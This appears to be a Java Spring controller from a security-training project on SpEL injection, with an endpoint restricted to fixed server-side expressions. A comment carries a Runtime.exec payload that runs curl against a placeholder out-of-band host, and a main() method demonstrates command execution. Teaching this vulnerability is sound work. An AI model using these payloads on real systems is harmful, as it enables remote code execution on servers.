package org.joychou.controller;

import org.springframework.web.util.HtmlUtils;
import org.springframework.expression.ConstructorResolver;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.MethodResolver;
import org.springframework.expression.PropertyAccessor;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.Collections;

/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // Restricted context: no type references (T(...)), no constructors, no method calls,
        // no property/bean access. Only literals and operators can be evaluated.
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setTypeLocator(typeName -> {
            throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
        });
        context.setConstructorResolvers(Collections.<ConstructorResolver>emptyList());
        context.setMethodResolvers(Collections.<MethodResolver>emptyList());
        context.setPropertyAccessors(Collections.<PropertyAccessor>emptyList());
        context.setBeanResolver(null);
        // Request text is never parsed: it only selects a server-owned constant expression.
        String constantExpression = selectExpression(expression);
        if (constantExpression == null) {
            return "Bad boy. I got u.";
        }
        Object value = parser.parseExpression(constantExpression).getValue(context);
        return HtmlUtils.htmlEscape(String.valueOf(value));
    }

    /**
     * Maps a request token to a literal expression owned by the server by comparing against
     * fixed strings. Returns null for any unknown token.
     */
    private static String selectExpression(String token) {
        String normalized = token == null ? "" : token.trim();
        switch (normalized) {
            case "sum":
                return "1 + 2";
            case "product":
                return "6 * 7";
            case "greeting":
                return "'Hello ' + 'SpEL'";
            default:
                return null;
        }
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

